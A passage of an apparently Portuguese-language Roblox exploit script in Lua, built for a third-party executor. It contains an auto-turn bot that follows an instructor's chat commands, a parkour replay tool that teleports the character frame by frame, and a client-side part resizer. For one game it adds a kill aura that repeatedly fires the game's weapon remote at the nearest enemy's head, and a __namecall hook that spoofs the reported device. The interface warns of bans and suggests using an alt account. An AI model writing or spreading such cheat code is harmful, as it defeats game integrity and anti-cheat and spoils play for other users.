            end, "RETAGUARDA VOLVER")

        elseif compact == "VANGUARDAVOLVER!" then
            enqueue(returnBase, "VANGUARDA VOLVER")
        end
    end

    local function hookLegacyChat()
        for _, plr in ipairs(Players:GetPlayers()) do
            local conn = plr.Chatted:Connect(function(msg)
                if Enabled and plr.Name:lower() == InstructorName:lower() then
                    handle(msg)
                end
            end)
            table.insert(Connections, conn)
        end

        table.insert(Connections, Players.PlayerAdded:Connect(function(plr)
            local conn = plr.Chatted:Connect(function(msg)
                if Enabled and plr.Name:lower() == InstructorName:lower() then
                    handle(msg)
                end
            end)
            table.insert(Connections, conn)
        end))
    end

    local function hookTextChat()
        local signal = TextChatService.OnIncomingMessage
        if typeof(signal) ~= "RBXScriptSignal" then
            hookLegacyChat()
            return
        end

        local conn = signal:Connect(function(message)
            if not Enabled or not message.TextSource then return end
            local plr = Players:GetPlayerByUserId(message.TextSource.UserId)
            if plr and plr.Name:lower() == InstructorName:lower() then
                handle(message.Text)
            end
        end)

        table.insert(Connections, conn)
    end

    local function enable()
        disconnectAll()
        table.clear(CommandQueue)

        local hrp = getHRP()
        if hrp then
            local _, y, _ = hrp.CFrame:ToOrientation()
            BaseYaw = y
        end

        Notify("Auto volver's", "Ativado.")

        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            hookTextChat()
        else
            hookLegacyChat()
        end
    end

    local function disable()
        disconnectAll()
        table.clear(CommandQueue)
        Processing = false
        Notify("Auto volver's", "Desativado.")
    end

    local Volvers = AutoSection:Tab({
        Title = "Auto volver's",
        Icon = "lucide:arrow-right-left",
        IconColor = Color3.fromHex("#F0DCC0")
    })

    Volvers:Input({
        Title = "Instrutor",
        Placeholder = "Nome do instrutor",
        Callback = function(v)
            if v ~= "" then
            InstructorName = v
           end
        end
    })

    Volvers:Toggle({
        Title = "Sufixo espaçado",
        Desc = 'Aceita somente se o sufixo "!" estiver espaçado ou não. DIREITA VOLVER! ≠ DIREITA VOLVER !',
        Callback = function(v)
            SuffixSpaced = v
        end
    })

    Volvers:Toggle({
        Title = "Ativar",
        Desc = "Ativa o auto volver's.",
        Callback = function(v)
            Enabled = v
            if v then enable() else disable() end
        end
    })
end

-- Parkour

local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local CurrentCamera = Workspace.CurrentCamera

local unpack = table.unpack or unpack

local BASE_COLOR_POS = Color3.fromRGB(0, 255, 255)
local BASE_COLOR_LOOK = Color3.fromRGB(255, 50, 100)
local PATH_COLOR = Color3.fromRGB(0, 200, 255)
local MATERIAL_INDICATOR = Enum.Material.ForceField
local TRANSPARENCY_INDICATOR = 0.1
local VIEWPORT_SIZE = UDim2.new(0, 150, 0, 150)
local PATH_THICKNESS = 0.1
local TARGET_FPS = 60
local FRAME_TIME = 1 / TARGET_FPS

local TAS_GUI_NAME = "."
local gethui_func = gethui or function() return game:GetService("CoreGui") end
local existingGui = gethui_func():FindFirstChild(TAS_GUI_NAME)
if existingGui then existingGui:Destroy() end

local TAS_GUI = Instance.new("ScreenGui")
TAS_GUI.Name = TAS_GUI_NAME
TAS_GUI.ResetOnSpawn = false
TAS_GUI.Parent = gethui_func()

local TAS_FOLDER = "fp3_Parkours"
if writefile and not isfolder(TAS_FOLDER) then
    makefolder(TAS_FOLDER)
end

local LoadedTAS = {}
local CurrentSelection = {}
local Recording = false
local RequestedPlay = false
local RecFrames = {}
local RecordConn
local CurrentName = ""

local TASDropdown
local StopButton
local DeleteButton
local IsConfirmingDelete = false

local function safeNotify(title, msg)
    if typeof(Notify) == "function" then
        Notify(title, msg)
    elseif typeof(getgenv) == "function" and typeof(getgenv().Notify) == "function" then
        getgenv().Notify(title, msg)
    end
end

local function getHRP()
    local c = LocalPlayer.Character
    return c and c:FindFirstChild("HumanoidRootPart")
end

local function getHumanoid()
    local c = LocalPlayer.Character
    return c and c:FindFirstChildOfClass("Humanoid")
end

local function stopMovementInput()
    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.W, false, game)
end

local function captureFrame()
    local hrp = getHRP()
    local hum = getHumanoid()
    if not hrp or not hum then return end

    return {
        cf  = { hrp.CFrame:GetComponents() },
        cam = { CurrentCamera.CFrame:GetComponents() },
        vel = { hrp.Velocity.X, hrp.Velocity.Y, hrp.Velocity.Z },
        jump = hum.Jump
    }
end

local function applyFrame(f)
    if not f then return end
    local hrp = getHRP()
    local hum = getHumanoid()
    if not hrp or not hum then return end

    if f.cf then hrp.CFrame = CFrame.new(unpack(f.cf)) end
    if f.vel then hrp.Velocity = Vector3.new(f.vel[1], f.vel[2], f.vel[3]) end
    if f.cam then CurrentCamera.CFrame = CFrame.new(unpack(f.cam)) end
    if f.jump ~= nil then hum.Jump = f.jump end
end

local function createViewportMarker(partToTrack)
    local viewportFrame = Instance.new("ViewportFrame")
    viewportFrame.Parent = TAS_GUI
    viewportFrame.BackgroundTransparency = 1
    viewportFrame.Size = VIEWPORT_SIZE
    viewportFrame.ZIndex = 10

    local viewportCamera = Instance.new("Camera")
    viewportCamera.Parent = viewportFrame

    local clone = partToTrack:Clone()
    clone.Parent = viewportFrame
    clone.Transparency = 0
    clone.Material = Enum.Material.Neon
    clone.CFrame = CFrame.new()

    local maxDimension = math.max(clone.Size.X, clone.Size.Y, clone.Size.Z)
    viewportCamera.CFrame =
        CFrame.new(0, maxDimension, maxDimension * 2.5) *
        CFrame.Angles(math.rad(-20), math.rad(180), 0)

    local conn = RunService.Stepped:Connect(function()
        if not partToTrack or not partToTrack.Parent then return end
        
        local pos, visible = CurrentCamera:WorldToScreenPoint(partToTrack.Position)
        viewportFrame.Position = UDim2.fromOffset(
            pos.X - viewportFrame.Size.X.Offset / 2,
            pos.Y - viewportFrame.Size.Y.Offset / 2
        )
        viewportFrame.Visible = visible
        
        clone.CFrame = CFrame.Angles(0, tick() % (math.pi * 2), 0)
    end)

    return {
        Frame = viewportFrame,
        Connection = conn,
        Part = partToTrack
    }
end

local function clearSingleTAS(name)
    local data = LoadedTAS[name]
    if not data then return end

    if data.MarkerConn then data.MarkerConn:Disconnect() end
    if data.PlayConn then data.PlayConn:Disconnect() end
    
    stopMovementInput()

    if data.VisualFolder then data.VisualFolder:Destroy() end

    if data.Viewports then
        for _, vp in ipairs(data.Viewports) do
            if vp.Connection then vp.Connection:Disconnect() end
            if vp.Frame then vp.Frame:Destroy() end
        end
    end
    
    if data.PathParts then
        for _, p in ipairs(data.PathParts) do
            if p then p:Destroy() end
        end
    end

    data.VisualFolder = nil
    data.Viewports = {}
    data.PathParts = {}
    data.Waiting = false
    data.Playing = false
end

local function buildPathLine(frames)
    local parts = {}
    if not frames or #frames < 2 then return parts end

    local parentFolder = Instance.new("Folder", Workspace)
    parentFolder.Name = "TAS_Path"

    for i = 1, #frames - 1 do
        if frames[i].cf and frames[i+1].cf then
            local startPos = Vector3.new(unpack(frames[i].cf))
            local endPos   = Vector3.new(unpack(frames[i+1].cf))
            local dist = (endPos - startPos).Magnitude

            if dist > 0.05 then
                local part = Instance.new("Part")
                part.Anchored = true
                part.CanCollide = false
                part.Material = Enum.Material.Neon
                part.Color = PATH_COLOR
                part.Transparency = 0.1
                part.Size = Vector3.new(PATH_THICKNESS, PATH_THICKNESS, dist)
                part.CFrame = CFrame.new(startPos:Lerp(endPos, 0.5), endPos)
                part.Parent = parentFolder
                table.insert(parts, part)
            end
        end
    end
    
    table.insert(parts, parentFolder) 
    return parts
end

local function activateTAS(name)
    local data = LoadedTAS[name]
    if not data or not data.Frames or #data.Frames == 0 then return end
    if data.Waiting or data.Playing then return end

    clearSingleTAS(name) 
    data.Waiting = true

    local startFrame = data.Frames[1]
    local cf = CFrame.new(unpack(startFrame.cf))

    local container = Instance.new("Folder", Workspace)
    container.Name = "_" .. name
    data.VisualFolder = container

    local function marker(n, shape, size, cframe, color, mat, transp)
        local p = Instance.new("Part")
        p.Name = n
        p.Shape = shape
        p.Size = size
        p.CFrame = cframe
        p.Anchored = true
        p.CanCollide = false
        p.Material = mat or MATERIAL_INDICATOR
        p.Color = color
        p.Transparency = transp or TRANSPARENCY_INDICATOR
        p.CastShadow = false
        p.Parent = container
        return p
    end

    local basePad = marker("BasePad", Enum.PartType.Cylinder, Vector3.new(0.2, 6, 6), cf * CFrame.new(0, -2.8, 0) * CFrame.Angles(0,0,math.rad(90)), BASE_COLOR_POS, Enum.Material.Neon, 0.3)
    local torso = marker("Torso", Enum.PartType.Block, Vector3.new(2, 2, 1), cf * CFrame.new(0, 0, 0), BASE_COLOR_POS, Enum.Material.ForceField, 0.02)
    local lLeg = marker("LLeg", Enum.PartType.Block, Vector3.new(1, 2, 1), cf * CFrame.new(-0.5, -2, 0), BASE_COLOR_POS, Enum.Material.ForceField, 0.02)
    local rLeg = marker("RLeg", Enum.PartType.Block, Vector3.new(1, 2, 1), cf * CFrame.new(0.5, -2, 0), BASE_COLOR_POS, Enum.Material.ForceField, 0.02)
    local lArm = marker("LArm", Enum.PartType.Block, Vector3.new(1, 2, 1), cf * CFrame.new(-1.5, 0, 0), BASE_COLOR_POS, Enum.Material.ForceField, 0.02)
    local rArm = marker("RArm", Enum.PartType.Block, Vector3.new(1, 2, 1), cf * CFrame.new(1.5, 0.5, -1) * CFrame.Angles(math.rad(90), 0, 0), BASE_COLOR_POS, Enum.Material.ForceField, 0.02)
    
    table.insert(data.Viewports, createViewportMarker(torso))

    data.PathParts = buildPathLine(data.Frames)

    data.MarkerConn = RunService.Heartbeat:Connect(function()
        local hrp = getHRP()
        if not hrp then return end
        
        local t = tick()
        basePad.Transparency = 0.5 + math.sin(t * 3) * 0.2

        local delta = hrp.Position - cf.Position
        local flatDist = Vector3.new(delta.X,0,delta.Z).Magnitude
        local dot = hrp.CFrame.LookVector:Dot(cf.LookVector)

        if flatDist <= 2.5 and math.abs(delta.Y) <= 3 and dot >= math.cos(math.rad(25)) then
            if data.MarkerConn then data.MarkerConn:Disconnect() end
            
            if data.VisualFolder then data.VisualFolder:Destroy() end
            for _, vp in ipairs(data.Viewports) do
                if vp.Connection then vp.Connection:Disconnect() end
                if vp.Frame then vp.Frame:Destroy() end
            end
            for _, p in ipairs(data.PathParts) do
                if p then p:Destroy() end
            end

            data.Waiting = false
            data.Playing = true
            
            if StopButton then StopButton:Unlock() end

            local currentFrameIndex = 1
            local accumulator = 0
            
            data.PlayConn = RunService.Heartbeat:Connect(function(dt)
                accumulator = accumulator + dt
                local steps = 0
                
                while accumulator >= FRAME_TIME and steps < 10 do
                    accumulator = accumulator - FRAME_TIME
                    steps = steps + 1
                    currentFrameIndex = currentFrameIndex + 1
                    
                    if currentFrameIndex == 2 then
                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.W, false, game)
                    end
                    if currentFrameIndex >= #data.Frames - 2 then
                        stopMovementInput()
                    end
                end

                if currentFrameIndex > #data.Frames then
                    stopMovementInput()
                    if data.PlayConn then data.PlayConn:Disconnect() end
                    data.Playing = false
                    if StopButton then StopButton:Lock() end
                    return
                end

                applyFrame(data.Frames[currentFrameIndex])
            end)
        end
    end)
end

local function toggleAll(enable)
    RequestedPlay = enable
    if enable then
        for name, _ in pairs(LoadedTAS) do
            activateTAS(name)
        end
    else
        for name, _ in pairs(LoadedTAS) do
            clearSingleTAS(name)
        end
        stopMovementInput()
        if StopButton then StopButton:Lock() end
    end
end

local function startRecording()
    if Recording then return end
    RecFrames = {}
    Recording = true
    
    local accumulator = 0
    RecordConn = RunService.Heartbeat:Connect(function(dt)
        accumulator = accumulator + dt
        while accumulator >= FRAME_TIME do
            accumulator = accumulator - FRAME_TIME
            local frame = captureFrame()
            if frame then
                table.insert(RecFrames, frame)
            end
        end
    end)
    safeNotify("TAS", "Gravação iniciada")
end

local function stopRecording()
    if not Recording then return end
    Recording = false
    if RecordConn then
        RecordConn:Disconnect()
        RecordConn = nil
    end
    safeNotify("TAS", "Gravação parada (" .. #RecFrames .. " frames)")
end

local function onChatCommand(msg)
    msg = msg:lower()
    if msg == "/e gravar" then
        startRecording()
    elseif msg == "/e parar" then
        stopRecording()
    end
end

if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.OnIncomingMessage = function(message)
        if message.TextSource and message.TextSource.UserId == LocalPlayer.UserId then
            onChatCommand(message.Text)
        end
    end
else
    LocalPlayer.Chatted:Connect(onChatCommand)
end

local function getSavedTAS()
    local out = {}
    if listfiles then
        for _, f in ipairs(listfiles(TAS_FOLDER)) do
            if f:sub(-5) == ".json" then
                out[#out + 1] = f:match("([^/]+)%.json$")
            end
        end
    end
    return out
end

local function saveCurrentTAS()
    if not CurrentName or CurrentName == "" or #RecFrames == 0 then return end
    writefile(TAS_FOLDER .. "/" .. CurrentName .. ".json", HttpService:JSONEncode({ Version = 1, Frames = RecFrames }))
    TASDropdown:Refresh(getSavedTAS())
end

local function updateSelection(selectedList)
    if type(selectedList) ~= "table" then
        selectedList = {selectedList}
    end
    CurrentSelection = selectedList

    local newSet = {}
    for _, name in ipairs(selectedList) do
        newSet[name] = true
    end

    for name, _ in pairs(LoadedTAS) do
        if not newSet[name] then
            clearSingleTAS(name)
            LoadedTAS[name] = nil
        end
    end

    for _, name in ipairs(selectedList) do
        if not LoadedTAS[name] and name ~= "" then
            local path = TAS_FOLDER .. "/" .. name .. ".json"
            if isfile(path) and readfile then
                local content = readfile(path)
                local decoded = HttpService:JSONDecode(content)
                LoadedTAS[name] = {
                    Frames = decoded.Frames or {},
                    Viewports = {},
                    PathParts = {},
                    Waiting = false,
                    Playing = false
                }
            end
        end
    end

    if RequestedPlay then
        for name, _ in pairs(LoadedTAS) do
            activateTAS(name)
        end
    end
end

local function deleteSelectedTAS()
    if #CurrentSelection == 0 then
        safeNotify("TAS", "Nenhuma gravação selecionada.")
        return
    end

    for _, name in ipairs(CurrentSelection) do
        local path = TAS_FOLDER .. "/" .. name .. ".json"
        if isfile(path) and delfile then delfile(path) end
        clearSingleTAS(name)
        LoadedTAS[name] = nil
    end

    CurrentSelection = {}
    local newValues = getSavedTAS()
    TASDropdown:Refresh(newValues)
    TASDropdown:Select({}) 
end

local TAS = ParkourSection:Tab({
    Title = "TAS",
    Icon = "lucide:video",
    IconColor = Color3.fromHex("#ED6DED")
})

TAS:Toggle({
    Title = "Iniciar",
    Callback = toggleAll
})

StopButton = TAS:Button({
    Title = "Parar",
    Desc = "Interrompe a reprodução atual",
    Locked = true,
    Callback = function()
        for _, data in pairs(LoadedTAS) do
            if data.Playing and data.PlayConn then
                stopMovementInput()
                data.PlayConn:Disconnect()
                data.Playing = false
            end
        end
        StopButton:Lock()
    end
})

TAS:Paragraph({
    Title = "Observação",
    Color = Color3.fromHex("#800080"),
    Image = "lucide:info",
    ImageSize = 30,
    Desc = "Todos os TAS são salvos na pasta fp3_Parkours do Workspace do seu executor."
})
TAS:Space()

local availableTAS = getSavedTAS()
TASDropdown = TAS:Dropdown({
    Title = "Selecionar gravações",
    Values = availableTAS,
    Value = {},
    Multi = true,
    AllowNone = true,
    Callback = updateSelection
})

DeleteButton = TAS:Button({
    Title = "Deletar selecionados",
    Desc = "Deleta todas as gravações selecionadas",
    Callback = function()
        if IsConfirmingDelete then
            deleteSelectedTAS()
            IsConfirmingDelete = false
            DeleteButton:SetTitle("Deletar selecionados")
            DeleteButton:SetDesc("Deleta todas as gravações selecionadas")
        else
            IsConfirmingDelete = true
            DeleteButton:SetTitle("Confirmação")
            DeleteButton:SetDesc("Clique novamente para apagar permanentemente.")
            task.delay(3, function()
                if IsConfirmingDelete then
                    IsConfirmingDelete = false
                    DeleteButton:SetTitle("Deletar selecionados")
                    DeleteButton:SetDesc("Deleta todas as gravações selecionadas")
                end
            end)
        end
    end
})

TAS:Space()

TAS:Paragraph({
    Title = "Observação",
    Color = Color3.fromHex("#800080"),
    Image = "lucide:info",
    ImageSize = 30,
    Desc = "Também é possível gravar e parar digitando /e gravar e /e parar no chat, respectivamente."
})
TAS:Space()

TAS:Input({
    Title = "Nome",
    Desc = "Nome que será dado ao TAS",
    Callback = function(v)
        if v ~= "" then CurrentName = v end
    end
})
TAS:Space()

local g = TAS:Group()
g:Button({ Title = "Gravar", Callback = startRecording })
g:Space()
g:Button({ Title = "Parar", Callback = stopRecording })
TAS:Space()

TAS:Paragraph({
    Title = "Observação",
    Color = Color3.fromHex("#800080"),
    Image = "lucide:info",
    ImageSize = 30,
    Desc = "Ao salvar, o arquivo ficará na pasta fp3_Parkours do Workspace do seu executor."
})
TAS:Button({ Title = "Salvar", Callback = saveCurrentTAS })

-- F3X
do
    local Mouse = Player:GetMouse()

    local F3X_FOLDER = "fp3_F3X"
    if writefile and not isfolder(F3X_FOLDER) then
        makefolder(F3X_FOLDER)
    end

    local Enabled = false
    local SelectedParts = {}
    local Highlights = {}
    local UndoStack = {}
    local RedoStack = {}
    local ModifiedParts = {}

    local SelectedConfig
    local CurrentConfigName

    local TOLERANCE = 1

    local function round(n)
        return math.floor(n * 10 + 0.5) / 10
    end

    local function sizeMatch(a, b)
        return math.abs(a.X - b.X) <= TOLERANCE
           and math.abs(a.Y - b.Y) <= TOLERANCE
           and math.abs(a.Z - b.Z) <= TOLERANCE
    end

    local function clearHighlights()
        for _, h in ipairs(Highlights) do
            if h then h:Destroy() end
        end
        table.clear(Highlights)
    end

    local function clearSelection()
        table.clear(SelectedParts)
        clearHighlights()
        InfoParagraph:SetTitle("Nenhuma seleção")
        InfoParagraph:SetDesc("")
    end

    local function highlight(part)
        local h = Instance.new("Highlight")
        h.FillTransparency = 1
        h.OutlineTransparency = 0
        h.OutlineColor = Color3.fromRGB(0, 255, 255)
        h.Parent = part
        table.insert(Highlights, h)
    end

    local function updateUI()
        if #SelectedParts == 0 then
            InfoParagraph:SetTitle("Nenhuma seleção")
            InfoParagraph:SetDesc("")
            return
        end

        local s = SelectedParts[1].Size

        InfoParagraph:SetTitle(SelectedParts[1].Name)
        InfoParagraph:SetDesc(
            "X: " .. round(s.X) ..
            "\nY: " .. round(s.Y) ..
            "\nZ: " .. round(s.Z)
        )

        InputX:Set(tostring(round(s.X)))
        InputY:Set(tostring(round(s.Y)))
        InputZ:Set(tostring(round(s.Z)))
    end

    local function pushUndo()
        local snap = {}
        for _, p in ipairs(SelectedParts) do
            snap[p] = p.Size
        end
        table.insert(UndoStack, snap)
        table.clear(RedoStack)
    end

    local function applySize(v)
        pushUndo()
        for _, p in ipairs(SelectedParts) do
            p.Size = v
            ModifiedParts[p] = v
        end
        updateUI()
    end

    local function undo()
        local s = table.remove(UndoStack)
        if not s then return end
        local redo = {}
        for p, size in pairs(s) do
            redo[p] = p.Size
            p.Size = size
            ModifiedParts[p] = size
        end
        table.insert(RedoStack, redo)
        updateUI()
    end

    local function redo()
        local s = table.remove(RedoStack)
        if not s then return end
        local undo = {}
        for p, size in pairs(s) do
            undo[p] = p.Size
            p.Size = size
            ModifiedParts[p] = size
        end
        table.insert(UndoStack, undo)
        updateUI()
    end

    Mouse.Button1Down:Connect(function()
        if not Enabled then return end
        local t = Mouse.Target
        if not t or not t:IsA("BasePart") then return end

        for i, p in ipairs(SelectedParts) do
            if p == t then
                table.remove(SelectedParts, i)
                clearHighlights()
                for _, sp in ipairs(SelectedParts) do
                    highlight(sp)
                end
                updateUI()
                return
            end
        end

        if #SelectedParts > 0 and not sizeMatch(SelectedParts[1].Size, t.Size) then
            Notify("F3X", "Os itens selecionados devem ter o mesmo tamanho.")
            return
        end

        table.insert(SelectedParts, t)
        highlight(t)
        updateUI()
    end)

    local function listConfigs()
        local out = {}
        if listfiles then
            for _, f in ipairs(listfiles(F3X_FOLDER)) do
                if f:sub(-5) == ".json" then
                    out[#out + 1] = f:match("([^/]+)%.json$")
                end
            end
        end
        return out
    end

    local function saveConfig(name)
        if not name or name == "" then
            Notify("F3X", "Nome inválido.")
            return
        end

        local data = {
            PlaceId = game.PlaceId,
            Parts = {}
        }

        for part, size in pairs(ModifiedParts) do
            if part and part.Parent then
                data.Parts[#data.Parts + 1] = {
                    Path = part:GetFullName(),
                    CFrame = { part.CFrame:GetComponents() },
                    Size = { size.X, size.Y, size.Z }
                }
            end
        end

        writefile(F3X_FOLDER .. "/" .. name .. ".json", HttpService:JSONEncode(data))
        ConfigDropdown:Refresh(listConfigs())
        Notify("F3X", "Config salva")
    end

    local function applyConfig(name)
        if not name then return end
        local path = F3X_FOLDER .. "/" .. name .. ".json"
        if not isfile(path) then return end

        local data = HttpService:JSONDecode(readfile(path))

        if data.PlaceId ~= game.PlaceId then
            Notify("F3X", "Essa configuração não é desse mapa.")
            return
        end

        for _, v in ipairs(data.Parts or {}) do
            local cf = CFrame.new(unpack(v.CFrame))
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj:GetFullName() == v.Path then
                    if (obj.Position - cf.Position).Magnitude < 1 then
                        obj.Size = Vector3.new(unpack(v.Size))
                        break
                    end
                end
            end
        end

        Notify("F3X", "Aplicada.")
    end

    local function deleteConfig()
        if not SelectedConfig then
            Notify("F3X", "Nenhuma configuração selecionada.")
            return
        end
        delfile(F3X_FOLDER .. "/" .. SelectedConfig .. ".json")
        SelectedConfig = nil
        ConfigDropdown:Refresh(listConfigs())
        Notify("F3X", "Deletada.")
    end

    local F3X = ParkourSection:Tab({
        Title = "F3X",
        Icon = "lucide:pencil"
    })

    F3X:Toggle({
        Title = "Ativar seleção",
        Callback = function(v)
            Enabled = v
            if not v then clearSelection() end
        end
    })

    InfoParagraph = F3X:Paragraph({ Title = "Nenhuma parte selecionada.", Desc = "" })
    F3X:Space()

    InputX = F3X:Input({ Title = "X (largura)" })
    F3X:Space()
    local gx = F3X:Group()
    gx:Button({ Title = "-0.2", Callback = function() InputX:Set(tostring((tonumber(InputX.Value) or 0) - 0.2)) end })
    gx:Space()
    gx:Button({ Title = "+0.2", Callback = function() InputX:Set(tostring((tonumber(InputX.Value) or 0) + 0.2)) end })

    F3X:Space()

    InputY = F3X:Input({ Title = "Y (altura)" })
    F3X:Space()
    local gy = F3X:Group()
    gy:Button({ Title = "-0.2", Callback = function() InputY:Set(tostring((tonumber(InputY.Value) or 0) - 0.2)) end })
    gy:Space()
    gy:Button({ Title = "+0.2", Callback = function() InputY:Set(tostring((tonumber(InputY.Value) or 0) + 0.2)) end })

    F3X:Space()

    InputZ = F3X:Input({ Title = "Z (profundidade)" })
    F3X:Space()
    local gz = F3X:Group()
    gz:Button({ Title = "-0.2", Callback = function() InputZ:Set(tostring((tonumber(InputZ.Value) or 0) - 0.2)) end })
    gz:Space()
    gz:Button({ Title = "+0.2", Callback = function() InputZ:Set(tostring((tonumber(InputZ.Value) or 0) + 0.2)) end })

    F3X:Space()

    F3X:Button({
        Title = "Aplicar",
        Callback = function()
            applySize(Vector3.new(
                tonumber(InputX.Value),
                tonumber(InputY.Value),
                tonumber(InputZ.Value)
            ))
        end
    })

    F3X:Space()

    local gUR = F3X:Group()
    gUR:Button({ Title = "Undo", Callback = undo })
    gUR:Space()
    gUR:Button({ Title = "Redo", Callback = redo })

    F3X:Space()

    F3X:Paragraph({
        Title = "Sistema de salvamento",
        Desc = "Permite salvar, deletar e aplicar as configurações."
    })

    ConfigDropdown = F3X:Dropdown({
        Title = "Configs",
        Values = listConfigs(),
        Callback = function(v) SelectedConfig = v end
    })

   F3X:Paragraph({
    Title = "Observação",
    Color = Color3.fromHex("#800080"),
    Image = "lucide:info",
    ImageSize = 30,
    Desc = "Todos os F3X são salvos na pasta fp3_F3X do Workspace do seu executor."
})
F3X:Space()

    F3X:Input({
        Title = "Nome da configuração",
        Callback = function(v) CurrentConfigName = v end
    })

    F3X:Space()

    local gCFG = F3X:Group()
    gCFG:Button({ Title = "Salvar", Callback = function() saveConfig(CurrentConfigName) end })
    gCFG:Space()
    gCFG:Button({ Title = "Aplicar", Callback = function() applyConfig(SelectedConfig) end })
    gCFG:Space()
    gCFG:Button({ Title = "Deletar", Callback = deleteConfig })
end


-- tevez

if TEVEZ_MAPA then

do
local TevezApenas = Window:Section({
    Title = "[EB] Tevez",
    Desc = "Exclusivos do jogo",
    Icon = "lucide:gamepad-2",
    IconColor = Color3.fromHex("#1C3811")
})

-- KILL AURA

local GS = Replicated:WaitForChild("GunSystem")
local GC = GS:WaitForChild("GunsConfigurations")
local FireEvent = GS.Remotes.Events.Fire
local ReloadFunction = GS.Remotes.Functions.Reload

local Active = true
local Aura = false
local Blocker = false
local Connections = {}
local Tasks = {}
local LastTargetTime = 0

local function track(c) table.insert(Connections, c) end
local function trackTask(t) table.insert(Tasks, t) end
local function reg(target) LastTargetTime = tick() end

local function HasGun()
    local bp = Player:FindFirstChild("Backpack")
    local char = Player.Character

    for _, cfg in ipairs(GC:GetChildren()) do
        local n = cfg.Name
        if (bp and bp:FindFirstChild(n)) or (char and char:FindFirstChild(n)) then
            return true
        end
    end
    return false
end

local function GetGun()
    local c = Player.Character
    if not c then return nil end

    local tool = c:FindFirstChildWhichIsA("Tool")
    if not tool then return nil end

    local cfgInstance = GC:FindFirstChild(tool.Name)
    if not cfgInstance then return nil end

    local ok, moduleTable = pcall(function() return require(cfgInstance) end)
    if ok and type(moduleTable) == "table" then
        return moduleTable, tool.Name
    end

if type(getgc) == "function" then
    for _, v in ipairs(getgc()) do
        if type(v) == "table" and rawget(v, "BackCFrame") and rawget(v, "Damage") then
            if rawget(v, "Name") == tool.Name or rawget(v, "Title") == tool.Name then
                return v, tool.Name
            end
        end
    end
end

return nil, tool.Name
end

local function ModifyGun(prop, val)
    local cfg, gunName = GetGun()
    if not cfg then
        Notify("Erro", "Não foi possível obter configuração da arma.")
        return
    end

    if rawget(cfg, prop) == nil then
        Notify("Erro", "Propriedade '"..tostring(prop).."' não existe nesta arma.")
        return
    end

    rawset(cfg, prop, val)
end

trackTask(task.spawn(function()
    while task.wait(0.25) do
        if not Active or not Aura or not HasGun() then continue end
        local c = Player.Character
        if not c then continue end

        local tool = c:FindFirstChildWhichIsA("Tool")
        if not tool then continue end

        pcall(function()
            ReloadFunction:InvokeServer(tool)
        end)
    end
end))

trackTask(task.spawn(function()
    local rp = RaycastParams.new()
    rp.FilterType = Enum.RaycastFilterType.Exclude

    while Active do
        if Aura and HasGun() and Player.Character then
            local c = Player.Character
            local tool = c:FindFirstChildWhichIsA("Tool")

            if tool then
                local cfgInstance = GC:FindFirstChild(tool.Name)
                if cfgInstance then
                    local cfgData = (pcall(function() return require(cfgInstance) end) and require(cfgInstance)) or nil
                    local firePart = tool:FindFirstChild("FirePart") or tool:FindFirstChild("Handle") or tool.PrimaryPart
                    if firePart then
                        rp.FilterDescendantsInstances = {Player.Character}

                        local target, dist = nil, math.huge

                        for _, plr in ipairs(Players:GetPlayers()) do
                            if plr ~= Player and plr.Team ~= Player.Team and plr.Character then
                                local h = plr.Character:FindFirstChildOfClass("Humanoid")
                                if h and h.Health > 0 then
                                    local head = plr.Character:FindFirstChild("Head") or plr.Character:FindFirstChild("HumanoidRootPart")
                                    if head then
                                        local d = (head.Position - firePart.Position).Magnitude
                                        if d < dist then
                                            dist = d
                                            target = head
                                        end
                                    end
                                end
                            end
                        end

                        if target then
                            local direction = target.Position - firePart.Position
                            local result = workspace:Raycast(firePart.Position, direction.Unit * direction.Magnitude, rp)

                            local hitPos = (result and result.Position) or target.Position
                            local info = {
                                [target] = {
                                    Normal   = (result and result.Normal) or Vector3.new(0,1,0),
                                    Position = hitPos,
                                    Instance = target,
                                    Distance = direction.Magnitude,
                                    Material = (result and result.Material) or Enum.Material.ForceField
                                }
                            }

                            pcall(function()
                                FireEvent:FireServer(tool, info, hitPos)
                            end)

                            reg(target.Parent)
                        end
                    end
                end
            end
        end

        task.wait()
    end
end))

-- UI MODS TEVEZ

do
    local TevezMods = TevezApenas:Tab({
        Title = "Mods",
        Icon = "lucide:chevrons-left-right-ellipsis",
        IconColor = Color3.fromHex("#C012FF")
    })

    local SectionKillAura = TevezMods:Section({
        Title = "Kill Aura"
    })

    SectionKillAura:Paragraph({
        Title = "Kill Aura [RISCO DE BAN]",
        Color = Color3.fromHex("#FF1D0D"),
        Desc = "Enquanto estiver com a arma, mata todos os inimigos ao redor de você. Não mata inimigos em safezones.",
    })

local KillAuraToggle

SectionKillAura:Toggle({
    Title = "Permitir",
    Desc = "O uso de kill aura é de sua conta e risco, você será banido caso for denunciado. Use uma alt.",
    Callback = function(state)
        if state then
            KillAuraToggle:Unlock()
            Notify("Permissão", "Concedida")
        else
            KillAuraToggle:Set(false) 
            
            KillAuraToggle:Lock()
            Notify("Permissão", "Negada.")
        end
    end
})

KillAuraToggle = SectionKillAura:Toggle({
    Title = "Kill-aura [RISCO DE BAN]",
    Callback = function(state)
        if state then
            if not HasGun() then
                Blocker = true
                KillAuraToggle:Set(false)
                Notify("Erro", "Você precisa de uma arma.")
                return
            end
            Aura = true
            Blocker = false
            Notify("Kill-aura", "Ativado")
        else
            Aura = false
            Notify("Kill-aura", "Desativado")
        end
    end
})

KillAuraToggle:Lock()


SectionKillAura:Space()

local SectionArma = TevezMods:Section({
        Title = "Outros"
    })

local DeviceRemote = Replicated:WaitForChild("Assets"):WaitForChild("Remotes"):WaitForChild("Device")

local SpoofEnabled = false
local SelectedDevice = "Mobile"

local OldNameCall
OldNameCall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod()

    if self == DeviceRemote and method == "FireServer" and SpoofEnabled then
        local args = {...}

        args[1] = SelectedDevice 
        
        return OldNameCall(self, unpack(args))
    end
    
    return OldNameCall(self, ...)
end))


SectionArma:Paragraph({
    Title = "Spoofer",
    Desc = "O spoofer permite você alterar o dispositivo mostrado no jogo."
})

SectionArma:Dropdown({
    Title = "Dispositivo",
    Desc = "Selecione o dispositivo.",
    Values = { "Mobile", "Computer" },
    Value = "Computer",
    Callback = function(option)
        SelectedDevice = option
    end
})

